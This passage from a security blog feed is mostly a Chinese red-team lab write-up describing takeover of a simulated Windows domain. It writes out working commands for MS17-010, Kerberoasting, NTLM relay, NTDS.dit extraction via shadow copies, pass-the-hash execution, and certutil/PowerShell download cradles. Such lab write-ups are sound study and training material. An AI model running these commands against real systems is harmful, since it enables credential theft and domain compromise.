0</span><br></pre></td></tr></table></figure></li><li><p>略….</p></li></ul><h1 id="0x05-参考"><a href="#0x05-参考" class="headerlink" title="0x05 参考"></a>0x05 参考</h1><p><a href="https://en.wikipedia.org/wiki/Pass_the_hash" target="_blank" rel="noopener">Pass the hash</a><br><a href="https://www.anquanke.com/post/id/85995" target="_blank" rel="noopener">从hash传递攻击谈相关Windows安全机制</a><br><a href="https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material#ESAE_BM" target="_blank" rel="noopener">Active Directory administrative tier model</a><br><a href="https://www.anquanke.com/post/id/86054" target="_blank" rel="noopener">如何检测Windows中的横向渗透攻击</a><br><a href="https://blog.stealthbits.com/how-to-detect-pass-the-hash-attacks/" target="_blank" rel="noopener">HOW TO DETECT PASS-THE-HASH ATTACKS</a><br><a href="https://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283" target="_blank" rel="noopener">Pass-the-hash attacks: Tools and Mitigation</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个&lt;strong&gt;[ 知识回顾 ]&lt;/strong&gt;系列文章，整合记录的是在掌握知识点中，所忽略的点、涉及的原理等；&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>内网练习（四）- 知识梳理</title>
    <link href="https://rcoil.me/2019/03/%E5%86%85%E7%BD%91%E7%BB%83%E4%B9%A0%EF%BC%88%E5%9B%9B%EF%BC%89/"/>
    <id>https://rcoil.me/2019/03/内网练习（四）/</id>
    <published>2019-03-11T03:13:38.000Z</published>
    <updated>2019-04-10T06:37:28.261Z</updated>
    
    <content type="html"><![CDATA[<p>环境为模拟环境，文章使用的均为公开测试工具且未涉及到各个方法的原理。</p><p>分享便是我最好的老师。   ——Micropoor</p><a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在渗透测试中，经常会遇到一些奇奇怪怪的环境。本文所采用的环境是一个红蓝对抗靶场，以贴切实际环境为出发点。</p><ul><li>目的：摸清整个内网拓扑图、获取域控内的flag文件及指定域用户手中的flag。</li><li>提示：flag{ooxx-ooxx}</li></ul><ul><li><p>初始网络拓扑</p><p><img src="/image/内网练习（四）/初始网络拓扑.png" alt="初始网络拓扑"></p></li></ul><h1 id="0x01-靶机信息收集"><a href="#0x01-靶机信息收集" class="headerlink" title="0x01 靶机信息收集"></a>0x01 靶机信息收集</h1><p>因为是模拟环境，所以初始权限为<code>win7域用户权限</code>（上了RAT–&gt;http协议）。</p><ul><li><code>DKRST011</code>的基本信息</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">机器名: DKRST011</span><br><span class="line">权限: 域用户权限(rcoil\tk001)</span><br><span class="line">系统: Windows <span class="number">7</span> Professional <span class="number">6.1</span><span class="number">.7601</span> Service Pack <span class="number">1</span> Build <span class="number">7601</span> x64</span><br><span class="line">Domain: rcoil.local</span><br><span class="line">IP地址: <span class="number">172.16</span><span class="number">.238</span><span class="number">.29</span></span><br><span class="line">杀软: McAfee(非最新版)</span><br><span class="line">补丁情况：[*<span class="number">240</span>]</span><br><span class="line">.NET版本：V1<span class="number">.0</span>、V1<span class="number">.1</span>、V2<span class="number">.0</span>、V3<span class="number">.0</span>、V3<span class="number">.5</span>、V4<span class="number">.0</span></span><br><span class="line">已有操作: 密码拖取（需要未提权）、全盘文件列表获取、浏览器浏览记录及密码、TCP连接及进程等相关基础操作</span><br><span class="line">额为信息: <span class="number">192.168</span><span class="number">.5</span><span class="number">.6</span>:<span class="number">8080</span>为内网代理服务 --&gt; Linux</span><br></pre></td></tr></table></figure><p>在收集信息的时候发现<code>TCP连接</code>都是内网连接，而RAT的进程连接也是内网，感觉网络有问题。</p><p>探测出网情况：此机器为半脱网情况，<code>dns、icmp、udp均不可出来</code>，http与https协议可出网。所有出网程序连接均为<code>192.10.22.6:8080</code>，由此初步判断为代理出网情况，且是http无限制出网。</p><p>通过对带有password等关键字眼的文件进行搜索拖取，当作储备。</p><ul><li><strong>内网存活探测</strong></li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- ICMP</span><br><span class="line">- SMB</span><br><span class="line">172.16.88.0/16</span><br><span class="line">192.168.5.0/16</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span></span><br></pre></td></tr></table></figure><h1 id="0x02-对域内信息进行获取"><a href="#0x02-对域内信息进行获取" class="headerlink" title="0x02 对域内信息进行获取"></a>0x02 对域内信息进行获取</h1><p>从全盘文件列表中可看到<code>setspn</code>是存在的，但是在我进行对域信息进行收集的时候发现已经没了（两个操作之间隔着一段时间）。为了方便操作（<code>socks代理</code>），所以使用<code>Cobalt Strike</code>上线操作。</p><h2 id="1）问题（均为RAT上运行）"><a href="#1）问题（均为RAT上运行）" class="headerlink" title="1）问题（均为RAT上运行）"></a>1）问题（均为RAT上运行）</h2><ul><li><code>Cobalt Strike</code>免杀问题；</li><li><code>powerview</code>运行无反应（powershell、C#）；</li><li><code>Bloodhound/Sharphou</code>运行无反应；</li><li><code>setspn.exe</code> 被删除。</li></ul><h2 id="2）方案"><a href="#2）方案" class="headerlink" title="2）方案"></a>2）方案</h2><ul><li>免杀<code>shellcode</code>，使用加载器运行，<a href="https://github.com/Micropoor/Micro8/blob/master/payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%AC%AC%E4%BA%8C%E5%AD%A3%EF%BC%88%E7%AC%AC%E5%9B%9B%E5%8D%81%E5%85%AB%E8%AF%BE%EF%BC%89.pdf" target="_blank" rel="noopener">例子</a> ；</li><li><code>Cobalt Strike</code>的<code>execute-assembly</code>运行本地相应C#程序；</li><li>使用<a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py" target="_blank" rel="noopener">GetUserSPNs</a> 替换<code>setspn</code>使用；<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python GetUserSPNs.py -request -dc-ip <span class="number">192.10</span><span class="number">.22</span><span class="number">.22</span> pentestlab.com/rcoil</span><br></pre></td></tr></table></figure></li></ul><h2 id="3）域信息的收集结果大致如下"><a href="#3）域信息的收集结果大致如下" class="headerlink" title="3）域信息的收集结果大致如下"></a>3）域信息的收集结果大致如下</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">域控：</span><br><span class="line">TTT<span class="number">-2</span>_172<span class="number">.16</span><span class="number">.88</span><span class="number">.21</span>_windows <span class="number">2016</span> x64 (主域控)</span><br><span class="line">TTT-V_172<span class="number">.16</span><span class="number">.88</span><span class="number">.20</span>_windows <span class="number">2016</span> x64 (辅助域控)</span><br><span class="line">域管理员：<span class="number">10</span>+</span><br><span class="line">域用户：<span class="number">200</span>+</span><br><span class="line">域内机器：<span class="number">150</span>+</span><br><span class="line">其他：略....</span><br></pre></td></tr></table></figure><h1 id="0x03-域控（域管理员）权限获取方法"><a href="#0x03-域控（域管理员）权限获取方法" class="headerlink" title="0x03 域控（域管理员）权限获取方法"></a>0x03 域控（域管理员）权限获取方法</h1><p>按照当前权限，梳理出一些知识点，大概可支持当前应用（知识串联）。</p><h2 id="1）-常规方法及结果"><a href="#1）-常规方法及结果" class="headerlink" title="1） 常规方法及结果"></a>1） 常规方法及结果</h2><ul><li><p><strong>组策略漏洞（GPP）</strong>–&gt; （MS14-025）</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">方法：</span><br><span class="line">enum4linux -a -u tk001 -p P@ssw0rd <span class="number">172.16</span><span class="number">.88</span><span class="number">.21</span> (数据收集)</span><br><span class="line">smbclient <span class="comment">//172.16.88.21/SYSVOL -U tk001</span></span><br><span class="line">或者使用msf</span><br><span class="line">auxiliary/scanner/smb/smb_enum_gpp</span><br><span class="line">[*] 结果：</span><br><span class="line">失败（其实单单看是<span class="number">2016</span> server系统就知道不会成功）</span><br></pre></td></tr></table></figure></li><li><p><strong>MS17-010</strong></p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*]msf</span><br><span class="line">auxiliary<span class="meta-keyword">/admin/</span>smb/ms17_010_command         </span><br><span class="line">auxiliary<span class="meta-keyword">/scanner/</span>smb/smb_ms17_010</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_eternalblue_win8</span><br><span class="line">exploit<span class="meta-keyword">/windows/</span>smb/ms17_010_psexec</span><br><span class="line">[*] 结果：</span><br><span class="line">TTT-V_172<span class="number">.16</span><span class="number">.88</span><span class="number">.20</span>成功执行命令</span><br></pre></td></tr></table></figure></li><li><p><strong>Kerberoasting</strong></p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[*]GetUserSPNs.<span class="keyword">py</span></span><br><span class="line"><span class="keyword">python</span> GetUserSPNs.<span class="keyword">py</span> -request -dc-ip <span class="number">192.10</span>.<span class="number">22.22</span> pentestlab.<span class="keyword">com</span>/rcoil </span><br><span class="line">关闭Kerberos预身份认证</span><br><span class="line">[*]Rubeus --&gt; http<span class="variable">s:</span>//github.<span class="keyword">com</span>/GhostPack/Rubeus</span><br><span class="line">Rubeus.<span class="keyword">exe</span> asreproast # 枚举所有域用户（或者指定）Roasting AS-REPs</span><br><span class="line">[*] 结果:</span><br><span class="line">失败</span><br></pre></td></tr></table></figure></li></ul><h2 id="2）-主流方法及结果"><a href="#2）-主流方法及结果" class="headerlink" title="2） 主流方法及结果"></a>2） 主流方法及结果</h2><ul><li><p><strong>基于资源约束委派</strong>(RBCD) –&gt; （未尝试）</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[<span class="meta">*</span>] 条件：<span class="number">2012</span>+域控制器</span><br><span class="line">[<span class="meta">*</span>] powermad</span><br><span class="line">[<span class="meta">*</span>] powerview</span><br><span class="line">[<span class="meta">*</span>] Rubeus</span><br><span class="line">[<span class="meta">*</span>] SharpAllowedToAct</span><br><span class="line">https:<span class="comment">//github.com/pkb1s/SharpAllowedToAct</span></span><br></pre></td></tr></table></figure></li><li><p><strong>NTLM中继攻击</strong>（未尝试）</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Responder</span><br><span class="line">windows版本：https:<span class="regexp">//gi</span>thub.com<span class="regexp">/Kevin-Robertson/</span>Inveigh（修改函数名绕杀软等方法）</span><br><span class="line">linux版本：https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SpiderLabs/</span>Responder</span><br><span class="line">[*] mitm6+ntlmrelayx</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/fox-it/mi</span>tm6</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/SecureAuthCorp/im</span>packet<span class="regexp">/blob/m</span>aster<span class="regexp">/examples/</span>ntlmrelayx.py</span><br><span class="line">[*] CrackMapExec</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/byt3bl33d3r/</span>CrackMapExec</span><br></pre></td></tr></table></figure></li><li><p><strong>Exchange</strong> （未启用Exchange）</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Privexchange</span></span><br><span class="line"><span class="selector-tag">privexchange</span><span class="selector-class">.py</span> <span class="selector-tag">-ah</span> 172<span class="selector-class">.16</span><span class="selector-class">.238</span><span class="selector-class">.29</span> <span class="selector-tag">TTT-2</span><span class="selector-class">.rcoil</span><span class="selector-class">.local</span> <span class="selector-tag">-u</span> <span class="selector-tag">tk001</span> <span class="selector-tag">-d</span> <span class="selector-tag">rcoil</span><span class="selector-class">.local</span> <span class="selector-tag">-p</span> <span class="selector-tag">P</span>@<span class="keyword">ssw0rd</span>  # Privexchange.py对echange进行API调用</span><br><span class="line">ntlmrelayx.py -t ldap://<span class="number">172.16</span>.<span class="number">88.21</span> --escalate-user tk001 # ntlmrelayx将Exchange服务器的凭据中继到主DC，然后升级tk001的权限</span><br><span class="line">secretsdump.py rcoil/tk001@TTT-<span class="number">2</span>.rcoil.local -just-dc</span><br><span class="line"></span><br><span class="line">[*] Exchange2domain --&gt; 一体化的privexchange工具</span><br><span class="line">https://github.com/Ridter/Exchange2domain</span><br></pre></td></tr></table></figure></li></ul><h2 id="3）-辅助工具"><a href="#3）-辅助工具" class="headerlink" title="3） 辅助工具"></a>3） 辅助工具</h2><ul><li><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">BloodHound</a> –&gt; 映射出活动目录关系</li><li><a href="https://github.com/hausec/ADAPE-Script" target="_blank" rel="noopener">ADAPE-Script </a> –&gt; AD评估和权限提升脚本</li><li><a href="https://raw.githubusercontent.com/samratashok/nishang/master/Escalation/Invoke-PsUACme.ps1" target="_blank" rel="noopener">Invoke-PsUACme</a> –&gt; 绕过UAC</li><li><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">CrackMapExec</a> –&gt;  查找特权帐户等等等利用</li><li><a href="https://github.com/byt3bl33d3r/SILENTTRINITY" target="_blank" rel="noopener">SILENTTRINITY</a> –&gt;  后期利用</li><li>….</li></ul><p>除了以上这些点，还有很多方法，最无脑的就是查看当前用户具有读权限的域内所有共享，信息收集，翻一轮、</p><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[*] powerview</span><br><span class="line">Find-DomainShare -CheckShareAccess | <span class="type">fl</span> | <span class="type">Out</span>-<span class="keyword">File</span> domain-shares.txt</span><br><span class="line">[*] 略....</span><br></pre></td></tr></table></figure><h1 id="0x04-域控权限"><a href="#0x04-域控权限" class="headerlink" title="0x04 域控权限"></a>0x04 域控权限</h1><p><code>TTT-V_172.16.88.20</code>使用<code>MS17-010</code>成功执行命令。</p><p>域控信息：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">机器名: TTT-V</span><br><span class="line">权限: 域控权限</span><br><span class="line">系统: Windows Server <span class="number">2016</span> Standard <span class="number">10.0</span><span class="meta">.14393</span> N/A Build <span class="number">14393</span> x64</span><br><span class="line">OS Configuration: Additional/Backup Domain Controller</span><br><span class="line"><span class="symbol">Domain:</span> rcoil.local</span><br><span class="line"><span class="built_in">IP</span>地址: <span class="number">172.16</span><span class="meta">.88</span><span class="meta">.20</span></span><br><span class="line">杀软: McAfee(非最新版)</span><br><span class="line">补丁情况：[*<span class="number">2</span>]</span><br><span class="line"><span class="meta">.NET</span>版本：V1<span class="meta">.0</span>、V1<span class="meta">.1</span>、V2<span class="meta">.0</span>、V3<span class="meta">.0</span>、V3<span class="meta">.5</span>、V4<span class="meta">.0</span></span><br><span class="line">端口情况：无Web --&gt; TTT-<span class="number">2_172.16</span><span class="meta">.88</span><span class="meta">.21</span>存在<span class="number">80</span>端口IIS服务</span><br><span class="line">域信任关系：rcoil.local（root）</span><br><span class="line">   demo.rcoil.local</span><br></pre></td></tr></table></figure><p>往下的思路是这样的：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> 本机<span class="selector-tag">flag</span>获取</span><br><span class="line"><span class="selector-attr">[*]</span> 在<span class="selector-tag">TTT-V</span>机器上拖取<span class="selector-tag">NTDS</span><span class="selector-class">.dit</span>文件，本地恢复获取域内所有用户<span class="selector-tag">hash</span>。当然，能获取到明文是最好的。</span><br><span class="line"><span class="selector-attr">[*]</span> 使用<span class="selector-tag">CrackMapExec</span>、<span class="selector-tag">wmiexec</span>等工具执行相关操作（重点：以域管权限启动<span class="selector-tag">CS</span>，后使用<span class="selector-tag">PTH</span>攻击 <span class="selector-tag">--</span>&gt; 简直完美）。</span><br></pre></td></tr></table></figure><h2 id="1）实施"><a href="#1）实施" class="headerlink" title="1）实施"></a>1）实施</h2><ul><li><p><strong>flag获取</strong></p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] dir</span><br><span class="line">dir /s flag</span><br><span class="line">[*] powerview(可选)</span><br><span class="line">Invoke-Filefinder -Threads <span class="number">100</span> -<span class="keyword">Verbose</span> -Terms flag -IncludeC -OutFile <span class="keyword">C</span>:\Windows\Temp\flags.txt</span><br><span class="line"></span><br><span class="line">flag&#123;Genius_only_means_hard-working_all_one's_life&#125;</span><br></pre></td></tr></table></figure></li><li><p><strong>直接反弹<code>MS17-010</code>的shell进行操作</strong></p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">bind_tcp</span> --&gt;</span> 失败</span><br><span class="line"><span class="function"><span class="title">bind_pipe</span> --&gt;</span> 失败</span><br></pre></td></tr></table></figure></li><li><p><strong>IPC操作</strong></p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[*]</span> 不建议之操作</span><br><span class="line">添加添加系统隐藏账号密码进行IPC一系列操作</span><br><span class="line"><span class="string">[*]</span> 域管权限</span><br><span class="line">直接从域控IPC到DKRST011进行工具复制 --&gt; 拒绝访问</span><br></pre></td></tr></table></figure></li><li><p><strong>NTDS.dit</strong></p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c: </span><br><span class="line">copy <span class="symbol">\\</span>?<span class="symbol">\G</span>LOBALROOT<span class="symbol">\D</span>evice<span class="symbol">\H</span>arddiskVolumeShadowCopy1<span class="symbol">\w</span>indows<span class="symbol">\N</span>TDS<span class="symbol">\N</span>TDS.dit c:<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span class="symbol">\n</span>tds.dit </span><br><span class="line">copy <span class="symbol">\\</span>?<span class="symbol">\G</span>LOBALROOT<span class="symbol">\D</span>evice<span class="symbol">\H</span>arddiskVolumeShadowCopy1<span class="symbol">\w</span>indows<span class="symbol">\s</span>ystem32<span class="symbol">\c</span>onfig<span class="symbol">\S</span>YSTEM c:<span class="symbol">\w</span>indows<span class="symbol">\t</span>emp<span class="symbol">\s</span>ystem.hive</span><br><span class="line">vssadmin delete shadows /shadow=&#123;1xxxxx0b-e47d-xxxx-969f-8xxa4xxxx0xx&#125; /quiet</span><br><span class="line">最后通过 //172.16.88.21/SYSVOL 拖到 DKRST011 机器，本地恢复</span><br><span class="line">python secretsdump.py -ntds /root/ntds.dit -system /root/SYSTEM LOCAL</span><br><span class="line"></span><br><span class="line">域管理员的password为hash格式。</span><br><span class="line"></span><br><span class="line">后使用 CrackMapExec、wmiexec等工具进行进一步测试。</span><br></pre></td></tr></table></figure><p><strong>注：</strong>调用<code>Volume Shadow Copy</code>服务会产生日志文件，位于System下，<code>Event ID为7036</code></p></li></ul><h2 id="2）遇到问题"><a href="#2）遇到问题" class="headerlink" title="2）遇到问题"></a>2）遇到问题</h2><p>执行以下命令：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec<span class="selector-class">.py</span> -hashes LMHASH:NTHASH rcoil/administrator@<span class="number">172.16</span>.<span class="number">238.29</span> <span class="string">"c:\\payload.exe"</span></span><br></pre></td></tr></table></figure></p><p><code>Cobalt Strike</code>未上线，这个情况其实是第一次见。</p><p>以多种形式的<code>payload</code>运行也无果。</p><p>确认非协议问题，因为以同样的程序，在域用户权限下正常启动并上线。</p><h2 id="3）方案"><a href="#3）方案" class="headerlink" title="3）方案"></a>3）方案</h2><ul><li>获取明文密码，计划任务启动；</li><li>添加<code>HKLM自启注册表</code></li></ul><h1 id="0x05-获取域管明文密码"><a href="#0x05-获取域管明文密码" class="headerlink" title="0x05 获取域管明文密码"></a>0x05 获取域管明文密码</h1><p>使用<code>powerview</code>查询域管登陆过的机器：<br><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Find-DomainUserLocation == old Invoke-UserHunter</span></span><br><span class="line"><span class="meta"># enumerate servers that allow unconstrained Kerberos delegation and show all users logged in</span></span><br><span class="line">Find-DomainUserLocation -ComputerUnconstrained -ShowAll</span><br></pre></td></tr></table></figure></p><p>最后选择了<code>172.16.10.29</code>的<code>win 2008 server</code>的机器，而且这台机器上存在<code>AdAudit Plus</code>。</p><p><img src="/image/内网练习（四）/blog_2019-03-25_16-37-30.png" alt="blog_2019-03-25_16-37-30"></p><p>由于目前没有任何容器可提供文件传输，所以自建。</p><ul><li><p>在<code>DKRST011</code>机器创建<code>FTP</code>或者<code>Web</code>服务；</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> SimpleHTTPServer</span><br><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="type">PORT</span> = <span class="number">80</span></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) != <span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="string">"use: web.exe port"</span>)</span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line"><span class="type">PORT</span> = int(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="type">Handler</span> = <span class="type">SimpleHTTPServer</span>.<span class="type">SimpleHTTPRequestHandler</span></span><br><span class="line">httpd = <span class="type">SocketServer</span>.<span class="type">TCPServer</span>((<span class="string">""</span>, <span class="type">PORT</span>), <span class="type">Handler</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">"SimpleHTTPServer is "</span>, <span class="type">PORT</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">"by k8gege"</span></span><br><span class="line">httpd.serve_forever()</span><br><span class="line">来源：https:<span class="comment">//raw.githubusercontent.com/k8gege/K8tools/master/web.py </span></span><br><span class="line">注：这类型操作也需要添加防火墙规则，防止弹窗</span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">"web.exe"</span> dir=<span class="keyword">in</span> program=<span class="string">"c:\Users\Public\Downloads\web.exe"</span> action=allow</span><br></pre></td></tr></table></figure></li><li><p>使用<code>certutil</code>、<code>bitsadmin</code>、<code>powersehll</code>等自带程序下载；</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[*]</span> certutil -urlcache -split -f  http://<span class="number">172.16.238.29</span>/<span class="number">1</span>.rar <span class="number">2</span>.rar</span><br><span class="line"><span class="string">[*]</span> bitsadmin /rawreturn /transfer 任务名 http://<span class="number">172.16.238.29</span>/<span class="number">1</span>.rar <span class="number">2</span>.rar</span><br><span class="line"><span class="string">[*]</span> powershell -WindowStyle Hidden <span class="string">"IEX (New-Object Net.WebClient).DownloadFile('http://172.16.238.29/1.rar','c:\windows\temp\ 2.rar')"</span></span><br></pre></td></tr></table></figure><p>这里有人就会问了，为什么不将需要使用的东西放入到域共享目录里面，原因是要操作的机器访问域共享提示无法访问。</p></li></ul><p>往下就是<code>Procdump</code>的一些操作，成功获取到明文密码。</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">[*]</span> 高权限计划任务启动CS服务端，未上线。</span><br><span class="line"><span class="string">[*]</span> 添加HKLM自启动，未上线。</span><br><span class="line"></span><br><span class="line">这是什么问题呢？（未解决）</span><br></pre></td></tr></table></figure><h1 id="0x05-其余flag获取"><a href="#0x05-其余flag获取" class="headerlink" title="0x05 其余flag获取"></a>0x05 其余flag获取</h1><p>从提示与目的来判断，剩下的<code>2个flag</code>位于<code>demo.rcoil.local域</code>的域控、域用户名为<code>flagav</code>的机器上。</p><ul><li><p><code>flagav</code>用户机器<br>直接从<code>AdAudit Plus</code>获取到域用户<code>flagav</code>的登陆情况，这样就不用去翻日志了。<br>使用<code>CrackMapExec</code>、<code>wmiexec</code>等工具执行命令查找flag：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">flag</span><span class="template-variable">&#123;Cease_to_struggle_and_you_cease_to_live&#125;</span><span class="xml"></span></span><br></pre></td></tr></table></figure></li><li><p>子域域控flag</p></li></ul><p>使用主域控的域管可直接登陆子域的域控</p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;Success<span class="number">_</span>grows<span class="number">_</span><span class="keyword">out</span><span class="number">_</span><span class="keyword">of</span><span class="number">_</span>struggles<span class="number">_</span>to<span class="number">_</span>overcome<span class="number">_</span>difficulties&#125;</span><br></pre></td></tr></table></figure><h1 id="0x0x-最后的拓扑"><a href="#0x0x-最后的拓扑" class="headerlink" title="0x0x 最后的拓扑"></a>0x0x 最后的拓扑</h1><p>好多没去了解，就草草结束了。</p><p><img src="/image/内网练习（四）/网络拓扑.png" alt="网络拓扑"></p><p><strong>免责声明：</strong>文章中所提到的工具/教程，不得用于商业或非法用途，否则后果自负。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;环境为模拟环境，文章使用的均为公开测试工具且未涉及到各个方法的原理。&lt;/p&gt;
&lt;p&gt;分享便是我最好的老师。   ——Micropoor&lt;/p&gt;
    
    </summary>
    
      <category term="内网渗透" scheme="https://rcoil.me/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网" scheme="https://rcoil.me/tags/%E5%86%85%E7%BD%91/"/>
    
      <category term="系统安全" scheme="https://rcoil.me/tags/%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>【域渗透】获取域环境内用户登录信息</title>
    <link href="https://rcoil.me/2018/11/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91%E8%8E%B7%E5%8F%96%E5%9F%9F%E7%8E%AF%E5%A2%83%E5%86%85%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%E4%BF%A1%E6%81%AF/"/>
    <id>https://rcoil.me/2018/11/【域渗透】获取域环境内用户登录信息/</id>
    <published>2018-11-26T08:06:48.000Z</published>
    <updated>2018-11-27T03:31:50.019Z</updated>
    
